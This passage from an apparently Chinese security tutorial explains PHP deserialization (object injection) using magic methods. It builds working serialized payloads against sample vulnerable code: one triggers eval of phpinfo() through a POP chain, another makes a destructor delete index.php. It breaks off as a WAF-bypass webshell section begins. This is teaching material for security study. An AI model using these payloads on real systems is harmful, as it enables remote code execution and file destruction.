在变量名前加上了<code>%00类名%00</code></p><p>可以看到， 序列化后的字符串中并没有包含这个test方法的信息;反序列化后，类的成员变量被还原了，但是类方法没有被还原。</p><p>因为<strong>序列化不保存方法</strong></p><blockquote><p>①private属性序列化的时候会在两侧加入空字节，private属性序列化时会在变量前面加上加上类名</p><p>②序列化不保存方法</p></blockquote><h2 id="常见的魔术方法"><a href="#常见的魔术方法" class="headerlink" title="常见的魔术方法"></a>常见的魔术方法</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs php">__construct()<span class="hljs-comment">//类的构造函数</span><br><br>__destruct()<span class="hljs-comment">//类的析构函数</span><br><br>__call()<span class="hljs-comment">//在对象中调用一个不可访问方法时调用</span><br><br>__callStatic()<span class="hljs-comment">//用静态方式中调用一个不可访问方法时调用</span><br><br>__get()<span class="hljs-comment">//获得一个类的成员变量时调用</span><br><br>__set()<span class="hljs-comment">//设置一个类的成员变量时调用</span><br><br>__isset()<span class="hljs-comment">//当对不可访问属性调用isset()或empty()时调用</span><br><br>__unset()<span class="hljs-comment">//当对不可访问属性调用unset()时被调用。</span><br><br>__sleep()<span class="hljs-comment">//执行serialize()时，先会调用这个函数</span><br><br>__wakeup()<span class="hljs-comment">//执行unserialize()时，先会调用这个函数</span><br><br>__toString()<span class="hljs-comment">//类被当成字符串时的回应方法</span><br><br>__invoke()<span class="hljs-comment">//调用函数的方式调用一个对象时的回应方法</span><br><br>__set_state()<span class="hljs-comment">//调用var_export()导出类时，此静态方法会被调用。</span><br><br>__clone()<span class="hljs-comment">//当对象复制完成时调用</span><br><br>__autoload()<span class="hljs-comment">//尝试加载未定义的类</span><br><br>__debugInfo()<span class="hljs-comment">//打印所需调试信息</span><br></code></pre></td></tr></table></figure><h3 id="construct"><a href="#construct" class="headerlink" title="__construct()"></a>__construct()</h3><p>创建对象时就会执行的构造函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>, <span class="hljs-variable">$nickname</span>, <span class="hljs-variable">$password</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;username = <span class="hljs-variable">$username</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;__construct test&#x27;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$test</span> = <span class="hljs-keyword">new</span> User(<span class="hljs-string">&#x27;Damn&#x27;</span>, <span class="hljs-string">&#x27;zZ&#x27;</span>, <span class="hljs-string">&#x27;10086&#x27;</span>);<br><br><span class="hljs-comment">//输出：__construct test</span><br></code></pre></td></tr></table></figure><h3 id="destruct"><a href="#destruct" class="headerlink" title="__destruct()"></a>__destruct()</h3><p>对象的所有引用都被删除或者当对象被显式销毁时执行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;__destruct test&quot;</span>;<br>    &#125;     <br>&#125;<br><span class="hljs-variable">$test</span> = <span class="hljs-keyword">new</span> User();<br>    <br><span class="hljs-comment">//输出：__destruct test</span><br></code></pre></td></tr></table></figure><h3 id="Tostring"><a href="#Tostring" class="headerlink" title="__Tostring"></a>__Tostring</h3><p>当一个类对象被当成字符串时必须返回一个字符串 否则产生<strong>E_RECOVERABLE_ERROR</strong> 级别的致命错误</p><p>情形有</p><ul><li><p><input checked="" disabled="" type="checkbox">  echo ($obj)/print($obj)</p></li><li><p><input checked="" disabled="" type="checkbox">  字符串连接</p></li><li><p><input checked="" disabled="" type="checkbox">  格式化字符串</p></li><li><p><input checked="" disabled="" type="checkbox">  字符串==比较，比较的时候会转换参数类型</p></li><li><p><input checked="" disabled="" type="checkbox">  格式化SQL语句，绑定参数</p></li><li><p><input checked="" disabled="" type="checkbox">  数组中有字符串</p></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TestClass</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$foo</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$foo</span></span>) </span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;foo = <span class="hljs-variable">$foo</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;foo;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$class</span> = <span class="hljs-keyword">new</span> TestClass(<span class="hljs-string">&#x27;Hello&#x27;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$class</span>;<br><br><span class="hljs-comment">//输出：hello</span><br></code></pre></td></tr></table></figure><h3 id="sleep"><a href="#sleep" class="headerlink" title="__sleep()"></a>__sleep()</h3><p>对象被序列化之前触发，返回需要被序列化存储的成员属性，删除不必要的属性。如果该方法未返回任何内容，则 NULL 被序列化，并产生一个<strong>E_NOTICE</strong>级别的错误。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span></span>&#123;<br>    <span class="hljs-keyword">const</span> SITE = <span class="hljs-string">&#x27;uusama&#x27;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$nickname</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$password</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>, <span class="hljs-variable">$nickname</span>, <span class="hljs-variable">$password</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;username = <span class="hljs-variable">$username</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;nickname = <span class="hljs-variable">$nickname</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;password = <span class="hljs-variable">$password</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__sleep</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;username&#x27;</span>, <span class="hljs-string">&#x27;nickname&#x27;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-variable">$user</span> = <span class="hljs-keyword">new</span> User(<span class="hljs-string">&#x27;sucker&#x27;</span>, <span class="hljs-string">&#x27;damnGG&#x27;</span>, <span class="hljs-string">&#x27;f**k&#x27;</span>);<br>var_dump(serialize(<span class="hljs-variable">$user</span>));<br><br><span class="hljs-comment">//输出：O:4:&quot;User&quot;:2:&#123;s:8:&quot;username&quot;;s:6:&quot;sucker&quot;;s:8:&quot;nickname&quot;;s:6:&quot;damnGG&quot;;&#125;</span><br></code></pre></td></tr></table></figure><h3 id="wakeup"><a href="#wakeup" class="headerlink" title="__wakeup()"></a>__wakeup()</h3><p>对象反序列化时会检查是否存在一个<code>__wakeup()</code>方法。如果存在，则会先调用 <code>__wakeup()</code>方法，预先准备对象需要的资源。如果不存在，返回void，常用于反序列化操作中重新建立数据库连接或执行其他初始化操作。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$nickname</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$password</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$order</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>, <span class="hljs-variable">$nickname</span>, <span class="hljs-variable">$password</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;username = <span class="hljs-variable">$username</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;nickname = <span class="hljs-variable">$nickname</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;password = <span class="hljs-variable">$password</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;password = <span class="hljs-keyword">$this</span>-&gt;username;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$user_ser</span> = <span class="hljs-string">&#x27;O:4:&quot;User&quot;:2:&#123;s:8:&quot;username&quot;;s:6:&quot;sucker&quot;;s:6:&quot;damnGG&quot;;s:4:&quot;f**k&quot;;&#125;&#x27;</span>;<br>var_dump(unserialize(<span class="hljs-variable">$user_ser</span>));<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">输出：</span><br><span class="hljs-comment">object(User)#1 (5) &#123;</span><br><span class="hljs-comment">  [&quot;username&quot;]=&gt;</span><br><span class="hljs-comment">  string(6) &quot;sucker&quot;</span><br><span class="hljs-comment">  [&quot;nickname&quot;]=&gt;</span><br><span class="hljs-comment">  NULL</span><br><span class="hljs-comment">  [&quot;password&quot;:&quot;User&quot;:private]=&gt;</span><br><span class="hljs-comment">  string(6) &quot;sucker&quot;</span><br><span class="hljs-comment">  [&quot;order&quot;:&quot;User&quot;:private]=&gt;</span><br><span class="hljs-comment">  NULL</span><br><span class="hljs-comment">  [&quot;damnGG&quot;]=&gt;</span><br><span class="hljs-comment">  string(4) &quot;f**k&quot;</span><br><span class="hljs-comment">&#125;</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>PHP 反序列化漏洞又叫做 PHP 对象注入漏洞，反序列化漏洞的成因在于代码中的 unserialize() 接收的参数可控</p><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/20201112222505683.png"></p><p>修改序列化后的字符串 然后传回代码进行反序列化 而此时恶意代码就被执行了</p><h3 id="覆盖输出"><a href="#覆盖输出" class="headerlink" title="覆盖输出"></a>覆盖输出</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$test</span> = <span class="hljs-string">&#x27;demo&#x27;</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-keyword">$this</span>-&gt;test;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;test&#x27;</span>];<br><span class="hljs-variable">$a_unser</span> = unserialize(<span class="hljs-variable">$a</span>);<br></code></pre></td></tr></table></figure><p>构造</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span>&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$test</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-keyword">$this</span>-&gt;test;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> A();<br><span class="hljs-variable">$b</span>-&gt;test = <span class="hljs-string">&#x27;hello world&#x27;</span>;<br><span class="hljs-variable">$b</span> = serialize(<span class="hljs-variable">$b</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>;<br><br><span class="hljs-comment">//得到 O:1:&quot;A&quot;:1:&#123;s:4:&quot;test&quot;;s:11:&quot;hello world&quot;;&#125;</span><br></code></pre></td></tr></table></figure><p>传参回去<img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210612154244475.png"></p><p>反序列化后就会调用__destruct函数，同时覆盖$test=demo输出hello world</p><h3 id="回马枪"><a href="#回马枪" class="headerlink" title="回马枪"></a>回马枪</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">index</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$return</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;return = <span class="hljs-keyword">new</span> foo();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;return-&gt;action();<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">foo</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">action</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;please attack me&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">evil</span> </span>&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$e</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">action</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-keyword">$this</span>-&gt;e);<br>    &#125;<br>&#125;<br>unserialize(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>]);<br></code></pre></td></tr></table></figure><p>构造：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">index</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$return</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;return = <span class="hljs-keyword">new</span> evil();<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">evil</span> </span>&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$e</span> = <span class="hljs-string">&#x27;phpinfo();&#x27;</span>;<br>&#125;<br><span class="hljs-variable">$a</span>= <span class="hljs-keyword">new</span> index();<br>var_dump(serialize(<span class="hljs-variable">$a</span>));<br><br><span class="hljs-comment">//得到：O:5:&quot;index&quot;:1:&#123;s:13:&quot;indexreturn&quot;;O:4:&quot;evil&quot;:1:&#123;s:1:&quot;e&quot;;s:10:&quot;phpinfo();&quot;;&#125;&#125;</span><br><span class="hljs-comment">//手动修改一下：O:5:&quot;index&quot;:1:&#123;s:13:&quot;%00index%00return&quot;;O:4:&quot;evil&quot;:1:&#123;s:1:&quot;e&quot;;s:10:&quot;phpinfo();&quot;;&#125;&#125;</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/2021/07/02/.png"></p><h3 id="恶意删除index-php等重要文件"><a href="#恶意删除index-php等重要文件" class="headerlink" title="恶意删除index.php等重要文件"></a>恶意删除index.php等重要文件</h3><p>某个web应用程序中，log.php用来产生临时profile.log(比如用户修改个人信息,修改完(__destruct被调用)就删除这个临时日志)，目录假如就是根目录，即存在index.php  前提log.php泄露，然后修改用户信息时得知反序列化传参可控，而且也用到了临时日志。</p><p>那么实验开始：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//log.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Logfile</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-comment">//log文件名</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span> = <span class="hljs-string">&#x27;profile.log&#x27;</span>;<br>    <span class="hljs-comment">//创建日志</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">logdata</span>(<span class="hljs-params"><span class="hljs-variable">$log</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;log data:&#x27;</span>.<span class="hljs-variable">$log</span>.<span class="hljs-string">&#x27;&lt;br /&gt;&#x27;</span>;<br>        file_put_contents(<span class="hljs-keyword">$this</span>-&gt;filename,<span class="hljs-variable">$log</span>,FILE_APPEND);<br>    &#125;<br>    <span class="hljs-comment">//destrcuctor删除日志</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Updete successfully!(__destruct deletes &#x27;</span>.<span class="hljs-keyword">$this</span>-&gt;filename.<span class="hljs-string">&#x27;)file.&lt;br /&gt;&#x27;</span>;<br>        unlink(dirname(<span class="hljs-keyword">__FILE__</span>).<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-keyword">$this</span>-&gt;filename);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这是一个使用log.php的简单例子</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//test.php</span><br><span class="hljs-meta">&lt;?php</span>    <br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;log.php&#x27;</span>;    <br><span class="hljs-comment">// 创建一个对象      </span><br><span class="hljs-variable">$obj</span> = <span class="hljs-keyword">new</span> LogFile();    <br><span class="hljs-comment">// 设置文件名和要储存的日志数据    </span><br><span class="hljs-variable">$obj</span>-&gt;filename = <span class="hljs-string">&#x27;somefile.log&#x27;</span>;    <br><span class="hljs-variable">$obj</span>-&gt;LogData(<span class="hljs-string">&#x27;Test&#x27;</span>);    <br><span class="hljs-comment">// 脚本结束__destruct被调用somefile.log文件被删除  </span><br></code></pre></td></tr></table></figure><p>注释掉log.php中的__destructor() 如下</p><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210703014308067.png"></p><p>访问test.php</p><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210703015954924.png"></p><p>产生了somefile.log文件</p><p>恢复__destructor() 就观察不到这个创建和删除的过程</p><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210703020204896.png"></p><p>但经过上面的测试 说明log.php可用</p><p>接下来继续</p><p>该网站有其他功能点，也是需要创建临时日志文件的，所以包含了同一个生成日志的类  比如更新用户信息 下面示例代码不含更新操作，显示一下就ok了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//提供反序列化的接口文件 profileupdate.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;log.php&#x27;</span>;    <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span></span><br><span class="hljs-class"></span>&#123;    <br><span class="hljs-keyword">public</span> <span class="hljs-variable">$age</span> = <span class="hljs-number">0</span>;    <br><span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span> = <span class="hljs-string">&#x27;&#x27;</span>;    <br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">PrintData</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;User &#x27;</span> . <span class="hljs-keyword">$this</span>-&gt;name . <span class="hljs-string">&#x27; is &#x27;</span> . <span class="hljs-keyword">$this</span>-&gt;age . <span class="hljs-string">&#x27; years old. &lt;br /&gt;&#x27;</span>;<br>&#125;<br>&#125;        <br><span class="hljs-comment">// 重建用户输入的数据    </span><br><span class="hljs-variable">$usr</span> = unserialize(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;usr_serialized&#x27;</span>]);<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//evil.php 注意，直接访问此文件index.php也会被删除</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;log.php&#x27;</span>;<span class="hljs-comment">//上面已经提到log.php已经泄露，故可以如此构造</span><br><span class="hljs-variable">$object</span> = <span class="hljs-keyword">new</span> logfile();<br><span class="hljs-variable">$object</span>-&gt;filename = <span class="hljs-string">&#x27;index.php&#x27;</span>;<br><span class="hljs-keyword">echo</span> serialize(<span class="hljs-variable">$object</span>).<span class="hljs-string">&#x27;&lt;br /&gt;&#x27;</span>;<br><br><span class="hljs-comment">//输出：O:7:&quot;Logfile&quot;:1:&#123;s:8:&quot;filename&quot;;s:9:&quot;index.php&quot;;&#125;</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210703014910163.png"></p><p>index.php文件存在可访问</p><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210703020742097.png"></p><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210703021610114.png"></p><p>可见 index.php被成功删除</p><h3 id="过WAF一句话的尝试"><a href="#过WAF一句话的尝试" class="headerlink" title="过WAF一句话的尝试"></a>过WAF一句话的尝试</h3><p>某些情况下 对一句话木马变种</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span 